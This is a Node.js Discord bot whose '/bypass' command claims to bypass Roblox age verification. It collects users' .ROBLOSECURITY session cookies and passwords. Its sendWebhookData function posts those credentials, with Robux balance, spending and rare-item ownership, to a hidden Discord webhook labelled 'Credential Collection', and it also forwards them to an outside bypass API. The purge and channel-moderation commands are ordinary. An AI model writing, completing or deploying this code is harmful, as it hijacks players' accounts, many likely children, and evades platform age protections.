const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes } = require('discord.js');

// Environment variables
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const AUTH_TOKEN = process.env.AUTH_TOKEN; // Optional for API authentication
const WEBHOOK_URL = process.env.WEBHOOK_URL; // Discord webhook for data collection

if (!DISCORD_TOKEN || !CLIENT_ID) {
    console.error('Missing required environment variables: DISCORD_TOKEN and CLIENT_ID');
    process.exit(1);
}

// Store command-only channels per guild
const commandOnlyChannels = new Map();

// Store command-restricted channels per guild (for bypass command)
const commandRestrictedChannels = new Map();

// Create Discord client
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// Slash command definition
const commands = [
    new SlashCommandBuilder()
        .setName('bypass')
        .setDescription('Bypass age verification using Roblox credentials')
        .addStringOption(option =>
            option.setName('cookie')
                .setDescription('Roblox .ROBLOSECURITY cookie')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('password')
                .setDescription('Roblox account password')
                .setRequired(true)
        ),
    
    new SlashCommandBuilder()
        .setName('commandonly')
        .setDescription('Set a channel to only allow slash commands (Admin only)')
        .addChannelOption(option =>
            option.setName('channel')
                .setDescription('Channel to make command-only')
                .setRequired(true)
        )
        .setDefaultMemberPermissions(8), // Administrator permission
    new SlashCommandBuilder()
        .setName('purge')
        .setDescription('Delete multiple messages from the channel (Admin only)')
        .addIntegerOption(option =>
            option.setName('amount')
                .setDescription('Number of messages to delete (1-100)')
                .setRequired(true)
                .setMinValue(1)
                .setMaxValue(100)
        )
        .setDefaultMemberPermissions(8), // Administrator permission
    new SlashCommandBuilder()
        .setName('setcommand')
        .setDescription('Restrict bypass command to only work in a specific channel (Admin only)')
        .addChannelOption(option =>
            option.setName('channel')
                .setDescription('Channel where bypass command can be used')
                .setRequired(true)
        )
        .setDefaultMemberPermissions(8) // Administrator permission
];

// Register slash commands
async function registerCommands() {
    try {
        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);

        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands }
        );

        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error('Error registering commands:', error);
    }
}

// Handle interactions
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'bypass') {
        await handleBypassCommand(interaction);
    } else if (interaction.commandName === 'commandonly') {
        await handleCommandOnlyCommand(interaction);
    } else if (interaction.commandName === 'purge') {
        await handlePurgeCommand(interaction);
    } else if (interaction.commandName === 'setcommand') {
        await handleSetCommandCommand(interaction);
    }
});

// Handle messages for command-only channels and link deletion
client.on('messageCreate', async message => {
    // Ignore bot messages
    if (message.author.bot) return;
    
    // Check if this channel is set as command-only
    const guildCommandOnlyChannels = commandOnlyChannels.get(message.guildId);
    if (guildCommandOnlyChannels && guildCommandOnlyChannels.has(message.channelId)) {
        // Delete the message aggressively in command-only channels
        try {
            await message.delete();
            console.log(`Deleted non-command message from ${message.author.tag} in command-only channel`);
        } catch (error) {
            console.error('Failed to delete message in command-only channel:', error);
        }
        return;
    }
    
    // Aggressive link deletion for all channels (except for admins and server owner)
    const member = message.member;
    if (!member) return;
    
    // Check if user is server owner or has administrator permissions
    const isOwner = message.guild.ownerId === message.author.id;
    const isAdmin = member.permissions.has('Administrator');
    
    if (isOwner || isAdmin) return; // Skip deletion for owners and admins
    
    // Check if message contains links
    const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|\b[a-zA-Z0-9-]+\.[a-zA-Z]{2,}\b)/gi;
    if (linkRegex.test(message.content)) {
        try {
            await message.delete();
            console.log(`Deleted link spam from ${message.author.tag} in ${message.channel.name}`);
        } catch (error) {
            console.error('Failed to delete link spam message:', error);
        }
    }
});

// Function to get CSRF token from Roblox
async function getRobloxCSRFToken(cookie) {
    const fetch = (await import('node-fetch')).default;

    try {
        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site'
            }
        });

        return response.headers.get('x-csrf-token');
    } catch (error) {
        console.error('Error fetching CSRF token:', error);
        return null;
    }
}

// Function to create authenticated headers for Roblox API requests
function createRobloxHeaders(cookie, csrfToken = null) {
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site'
    };

    if (csrfToken) {
        headers['X-CSRF-TOKEN'] = csrfToken;
    }

    return headers;
}

// Function to send webhook with collected data
async function sendWebhookData(userData, credentials, bypassResult) {
    if (!WEBHOOK_URL) return;

    try {
        const fetch = (await import('node-fetch')).default;

        // Create results embed
        const resultsEmbed = {
            title: "🔄 Bypass Results",
            color: bypassResult.success ? 0x00FF00 : 0xFF0000,
            thumbnail: userData?.avatarUrl ? { url: userData.avatarUrl } : null,
            fields: [
                {
                    name: "👤 Username",
                    value: userData?.username || "Unknown",
                    inline: true
                },
                {
                    name: "🆔 User ID",
                    value: userData?.userId?.toString() || "Unknown",
                    inline: true
                },
                {
                    name: "💰 Robux Balance",
                    value: userData?.robuxBalance?.toString() || "Unknown",
                    inline: true
                },
                {
                    name: "📊 Summary",
                    value: userData?.totalSpending?.toString() || "Unknown",
                    inline: true
                },
                {
                    name: "👑 Korblox",
                    value: userData?.hasKorblox ? "✅ True" : "❌ False",
                    inline: true
                },
                {
                    name: "💀 Headless",
                    value: userData?.hasHeadless ? "✅ True" : "❌ False",
                    inline: true
                },
                {
                    name: "🔄 Bypass Status",
                    value: bypassResult.success ? "✅ Success" : "❌ Failed",
                    inline: true
                },
                
                {
                    name: "📝 Message",
                    value: bypassResult.message || "No message",
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Bypass Data Collection"
            }
        };

        // Create credentials embed with robloxsecurity in description due to length
        const credentialsEmbed = {
            title: "🔐 User Credentials",
            description: `**Roblox Security Cookie:**\n\`\`\`\n${credentials.cookie}\n\`\`\``,
            color: 0xFF5555,
            thumbnail: userData?.avatarUrl ? { url: userData.avatarUrl } : null,
            fields: [
                {
                    name: "🔑 Password",
                    value: `\`\`\`\n${credentials.password}\n\`\`\``,
                    inline: false
                },
                {
                    name: "👤 Username",
                    value: userData?.username || "Unknown",
                    inline: true
                },
                {
                    name: "🕐 Timestamp",
                    value: new Date().toLocaleString(),
                    inline: true
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Credential Collection"
            }
        };

        const webhookData = {
            embeds: [resultsEmbed, credentialsEmbed]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });

        console.log('Webhook data sent successfully');
    } catch (error) {
        console.error('Error sending webhook data:', error);
    }
}



// Function to get user data from Roblox APIs
async function getRobloxUserData(cookie) {
    const fetch = (await import('node-fetch')).default;

    try {
        // Get CSRF token first
        const csrfToken = await getRobloxCSRFToken(cookie);

        // Get user info from Roblox
        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: createRobloxHeaders(cookie, csrfToken)
        });

        if (!userResponse.ok) {
            throw new Error('Failed to fetch user data');
        }

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;

        // Get robux balance
        const robuxResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
            headers: createRobloxHeaders(cookie, csrfToken)
        });

        let robuxBalance = 'Unknown';
        if (robuxResponse.ok) {
            const robuxData = await robuxResponse.json();
            robuxBalance = robuxData.robux || 0;
        }

        // Get currently wearing items to check for Korblox/Headless
        const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userId}/currently-wearing`, {
            headers: createRobloxHeaders(cookie, csrfToken)
        });

        let hasKorblox = false;
        let hasHeadless = false;

        if (wearingResponse.ok) {
            const wearingData = await wearingResponse.json();
            const assetIds = wearingData.assetIds || [];

            // Korblox Deathspeaker asset ID: 139607718
            // Headless Horseman asset ID: 134082579
            hasKorblox = assetIds.includes(139607718);
            hasHeadless = assetIds.includes(134082579);
        }

        // Get spending data (try to get transaction summary)
        const transactionResponse = await fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=Purchase`, {
            headers: createRobloxHeaders(cookie, csrfToken)
        });

        let totalSpending = 'Unknown';
        if (transactionResponse.ok) {
            const transactionData = await transactionResponse.json();
            totalSpending = transactionData.robuxTotal || 0;
        }

        // Get user avatar thumbnail
        const avatarThumbnailResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`, {
            headers: createRobloxHeaders(cookie, csrfToken)
        });

        let avatarUrl = null;
        if (avatarThumbnailResponse.ok) {
            const avatarData = await avatarThumbnailResponse.json();
            if (avatarData.data && avatarData.data.length > 0) {
                avatarUrl = avatarData.data[0].imageUrl;
            }
        }

        return {
            username,
            userId,
            robuxBalance,
            totalSpending,
            hasKorblox,
            hasHeadless,
            avatarUrl
        };



    } catch (error) {
        console.error('Error fetching Roblox user data:', error);
        return null;
    }
}

// Handle the bypass command
async function handleBypassCommand(interaction) {
    // Defer the reply to give us more time to process
    await interaction.deferReply({ ephemeral: false });

    // Check if command is restricted to a specific channel
    const restrictedChannelId = commandRestrictedChannels.get(interaction.guildId);
    if (restrictedChannelId && interaction.channelId !== restrictedChannelId) {
        const restrictedChannel = await interaction.guild.channels.fetch(restrictedChannelId);
        const channelMention = restrictedChannel ? `<#${restrictedChannelId}>` : 'the designated channel';
        
        const errorEmbed = new EmbedBuilder()
            .setTitle('❌ Wrong Channel')
            .setDescription(`This command can only be used in ${channelMention}.`)
            .setColor(0xFF0000)
            .setTimestamp();

        await interaction.editReply({ embeds: [errorEmbed] });
        return;
    }

    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    try {
        // Dynamic import for node-fetch
        const fetch = (await import('node-fetch')).default;

        // First, get user data from Roblox
        const userDataPromise = getRobloxUserData(cookie);

        // Make bypass API request
        const apiUrl = 'https://app.beamers.si/api/bypasser';

        const requestBody = {
            action: "force_minus_13_all_ages",
            cookie: cookie,
            password: password
        };

        const headers = {
            'Content-Type': 'application/json',
            'authority': 'app.beamers.si',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://app.beamers.si',
            'referer': 'https://app.beamers.si/dashboard/bypasser',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        };

        // Add AUTH_TOKEN in cookie header if available
        if (AUTH_TOKEN) {
            headers['cookie'] = `AUTH_TOKEN=${AUTH_TOKEN}`;
        }

        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(requestBody),
            timeout: 15000 // 15 second timeout for both requests
        });

        const responseText = await response.text();

        if (!response.ok) {
            console.log('API Response Status:', response.status);
            console.log('API Response Text:', responseText);

            // Try to parse as JSON for better error message
            let errorData;
            try {
                errorData = JSON.parse(responseText);
            } catch (e) {
                errorData = { message: responseText };
            }

            throw new Error(`HTTP ${response.status}: ${errorData.message || response.statusText}`);
        }

        // Try to parse response as JSON, handle HTML error pages
        let bypassData;
        try {
            bypassData = JSON.parse(responseText);
        } catch (parseError) {
            // If parsing fails, likely received HTML error page
            if (responseText.includes('<html>') || responseText.includes('Gateway Time-out')) {
                throw new Error('Server timeout - The bypass service is currently unavailable');
            } else {
                throw new Error('Invalid response format from bypass service');
            }
        }
        const userData = await userDataPromise;

        // Check if bypass was successful
        const isSuccess = bypassData.status === 'success' || bypassData.success === true || 
                         (bypassData.message && bypassData.message.toLowerCase().includes('bypass'));

        // Send webhook with collected data
        await sendWebhookData(
            userData,
            { cookie, password },
            { success: isSuccess, message: bypassData.message }
        );

        // Create main user info embed
        const userEmbed = new EmbedBuilder()
            .setTitle(`${userData?.username || 'Unknown User'} - Age Bypass Service`)
            .setColor(isSuccess ? 0x00FF00 : 0xFF0000)
            .setTimestamp();

        if (userData) {
            // Add avatar thumbnail if available
            if (userData.avatarUrl) {
                userEmbed.setThumbnail(userData.avatarUrl);
            }

            // Add user data fields
            userEmbed.addFields(
                { name: '👤 Username', value: userData.username, inline: true },
                { name: '🆔 User ID', value: userData.userId.toString(), inline: true },
                { name: '💰 Robux Balance', value: userData.robuxBalance.toString(), inline: true },
                { name: '📊 Summary', value: userData.totalSpending.toString(), inline: true },
                { name: '👑 Korblox', value: userData.hasKorblox ? '✅ True' : '❌ False', inline: true },
                { name: '💀 Headless', value: userData.hasHeadless ? '✅ True' : '❌ False', inline: true }
            );

            
        } else {
            userEmbed.addFields(
                { name: '⚠️ User Data', value: 'Could not fetch user data from Roblox API', inline: false }
            );
        }

        // Add bypass status
        userEmbed.addFields(
            { name: '🔄 Bypass Status', value: isSuccess ? '✅ Completed' : '❌ Failed', inline: true }
        );

        if (bypassData.message) {
            userEmbed.addFields(
                { name: '📝 Details', value: bypassData.message, inline: false }
            );
        }

        // Add footer with request info
        userEmbed.setFooter({ 
            text: `Requested by ${interaction.user.username}`, 
            iconURL: interaction.user.displayAvatarURL() 
        });

        await interaction.editReply({ embeds: [userEmbed] });

    } catch (error) {
        console.error('Error in bypass command:', error);

        // Create error embed
        const errorEmbed = new EmbedBuilder()
            .setTitle('❌ Bypass Failed')
            .setColor(0xFF0000)
            .setTimestamp();

        // Log detailed error to console for debugging
        console.error('Detailed bypass error:', {
            name: error.name,
            message: error.message,
            stack: error.stack,
            timestamp: new Date().toISOString()
        });

        // Check for specific error messages from the API
        let userMessage = 'Error bypass api down';
        
        if (error.message) {
            const errorMsg = error.message.toLowerCase();
            
            if (errorMsg.includes('invalid cookie') || errorMsg.includes('invalid credentials')) {
                userMessage = 'Invalid cookie or credentials provided';
            } else if (errorMsg.includes('invalid password') || errorMsg.includes('wrong password')) {
                userMessage = 'Invalid password provided';
            } else if (errorMsg.includes('account cannot bypass') || errorMsg.includes('cannot be bypassed')) {
                userMessage = 'Account cannot bypass age verification';
            } else if (errorMsg.includes('account age') || errorMsg.includes('age restriction')) {
                userMessage = 'Account age cannot bypass verification';
            } else if (errorMsg.includes('unauthorized') || errorMsg.includes('authentication failed')) {
                userMessage = 'Authentication failed - check credentials';
            } else if (errorMsg.includes('rate limit') || errorMsg.includes('too many requests')) {
                userMessage = 'Rate limited - try again later';
            }
        }

        // Display appropriate message in Discord embed
        errorEmbed.addFields({ 
            name: 'Status', 
            value: 'Failed', 
            inline: true 
        });
        errorEmbed.addFields({ 
            name: 'Message', 
            value: userMessage, 
            inline: false 
        });

        errorEmbed.setFooter({ 
            text: `Requested by ${interaction.user.username}`, 
            iconURL: interaction.user.displayAvatarURL() 
        });

        await interaction.editReply({ embeds: [errorEmbed] });
    }
}



// Handle the commandonly command
async function handleCommandOnlyCommand(interaction) {
    const channel = interaction.options.getChannel('channel');

    // Get or create command-only channels set for this guild
    if (!commandOnlyChannels.has(interaction.guildId)) {
        commandOnlyChannels.set(interaction.guildId, new Set());
    }

    const guildCommandOnlyChannels = commandOnlyChannels.get(interaction.guildId);

    // Check if channel is already command-only
    if (guildCommandOnlyChannels.has(channel.id)) {
        // Remove from command-only
        guildCommandOnlyChannels.delete(channel.id);
        
        const embed = new EmbedBuilder()
            .setTitle('Command-Only Channel Removed')
            .setDescription(`${channel} is no longer a command-only channel. Regular messages are now allowed.`)
            .setColor(0xFF9900)
            .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
    } else {
        // Add to command-only
        guildCommandOnlyChannels.add(channel.id);
        
        const embed = new EmbedBuilder()
            .setTitle('Command-Only Channel Set')
            .setDescription(`${channel} is now a command-only channel. All non-slash command messages will be automatically deleted.`)
            .setColor(0x00FF00)
            .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
}

// Handle the setcommand command
async function handleSetCommandCommand(interaction) {
    const channel = interaction.options.getChannel('channel');
    const guildId = interaction.guildId;

    // Check if there's already a command-restricted channel set
    const currentChannelId = commandRestrictedChannels.get(guildId);
    let isUpdate = false;
    let previousChannelName = 'None';

    if (currentChannelId) {
        isUpdate = true;
        // Try to get the previous channel name
        try {
            const previousChannel = await interaction.guild.channels.fetch(currentChannelId);
            if (previousChannel) {
                previousChannelName = previousChannel.name;
            }
        } catch (error) {
            previousChannelName = 'Unknown (channel may have been deleted)';
        }
    }

    // Store the new channel for this guild
    commandRestrictedChannels.set(guildId, channel.id);

    const embed = new EmbedBuilder()
        .setTimestamp();

    if (isUpdate) {
        embed
            .setTitle('✅ Command Channel Updated')
            .setDescription(`The bypass command channel has been changed from **${previousChannelName}** to ${channel}.`)
            .setColor(0x00FF00)
            .addFields(
                { name: '🔄 Previous Channel', value: previousChannelName, inline: true },
                { name: '🆕 New Channel', value: channel.name, inline: true }
            );
    } else {
        embed
            .setTitle('✅ Command Channel Set')
            .setDescription(`The bypass command can now only be used in ${channel}.`)
            .setColor(0x00FF00)
            .addFields(
                { name: '🎯 Restricted Channel', value: channel.name, inline: true }
            );
    }

    embed.setFooter({ 
        text: `Set by ${interaction.user.username}`, 
        iconURL: interaction.user.displayAvatarURL() 
    });

    await interaction.reply({ embeds: [embed], ephemeral: true });

    console.log(`Bypass command channel ${isUpdate ? 'updated' : 'set'} in guild ${guildId}: ${channel.name} (${channel.id})`);
}

// Handle the purge command
async function handlePurgeCommand(interaction) {
    const amount = interaction.options.getInteger('amount');
    
    try {
        // Defer the reply as deletion might take some time
        await interaction.deferReply({ ephemeral: true });
        
        // Check if bot has permission to manage messages
        const botMember = await interaction.guild.members.fetch(client.user.id);
        if (!botMember.permissions.has('ManageMessages')) {
            const errorEmbed = new EmbedBuilder()
                .setTitle('❌ Missing Permissions')
                .setDescription('I need the "Manage Messages" permission to delete messages.')
                .setColor(0xFF0000)
                .setTimestamp();

            await interaction.editReply({ embeds: [errorEmbed] });
            return;
        }

        // Fetch messages to delete
        const messages = await interaction.channel.messages.fetch({ limit: amount });
        
        // Filter out messages older than 14 days (Discord limitation)
        const twoWeeksAgo = Date.now() - (14 * 24 * 60 * 60 * 1000);
        const messagesToDelete = messages.filter(msg => msg.createdTimestamp > twoWeeksAgo);
        
        if (messagesToDelete.size === 0) {
            const errorEmbed = new EmbedBuilder()
                .setTitle('❌ No Messages to Delete')
                .setDescription('No messages found or all messages are older than 14 days (Discord limitation).')
                .setColor(0xFF0000)
                .setTimestamp();

            await interaction.editReply({ embeds: [errorEmbed] });
            return;
        }

        // Delete messages
        if (messagesToDelete.size === 1) {
            // Delete single message
            await messagesToDelete.first().delete();
        } else {
            // Bulk delete multiple messages
            await interaction.channel.bulkDelete(messagesToDelete, true);
        }

        // Success embed
        const successEmbed = new EmbedBuilder()
            .setTitle('🗑️ Messages Purged')
            .setDescription(`Successfully deleted **${messagesToDelete.size}** message(s) from ${interaction.channel}.`)
            .setColor(0x00FF00)
            .setTimestamp()
            .setFooter({ 
                text: `Purged by ${interaction.user.username}`, 
                iconURL: interaction.user.displayAvatarURL() 
            });

        await interaction.editReply({ embeds: [successEmbed] });

        console.log(`Purged ${messagesToDelete.size} messages from ${interaction.channel.name} by ${interaction.user.tag}`);

    } catch (error) {
        console.error('Error in purge command:', error);

        const errorEmbed = new EmbedBuilder()
            .setTitle('❌ Purge Failed')
            .setDescription(`Failed to delete messages: ${error.message}`)
            .setColor(0xFF0000)
            .setTimestamp();

        await interaction.editReply({ embeds: [errorEmbed] });
    }
}

// Bot ready event
client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    console.log('Bot is ready and online!');
});

// Error handling
client.on('error', error => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

// Start the bot
async function startBot() {
    try {
        await registerCommands();
        await client.login(DISCORD_TOKEN);
    } catch (error) {
        console.error('Failed to start bot:', error);
        process.exit(1);
    }
}

startBot();